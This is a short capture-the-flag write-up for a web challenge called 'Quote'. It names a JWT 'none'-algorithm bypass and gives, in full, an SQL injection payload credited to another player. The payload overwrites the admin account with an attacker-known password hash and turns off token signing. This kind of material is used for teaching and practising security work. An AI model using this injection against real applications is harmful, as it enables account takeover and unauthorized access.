## Web - Quote
Solution 1: just registering a normal account then using jwt none algorithm 

Solution 2: from random player 
quote -> INSERT INTO User (username, password_hash, jwt_algorithm) VALUES ("ad"||"min", '$2b$12$9ZdLvg6oTpp.ekSXsBZMdeh2Ffg6genKCDN4QU4msDbrCgSdGVMeK', 'HS256') ON CONFLICT(username) DO UPDATE SET password_hash = '$2b$12$9ZdLvg6oTpp.ekSXsBZMdeh2Ffg6genKCDN4QU4msDbrCgSdGVMeK',    jwt_algorithm = 'none' -- -;

for summarize, they used concatenation to register a admin account with the password they control.

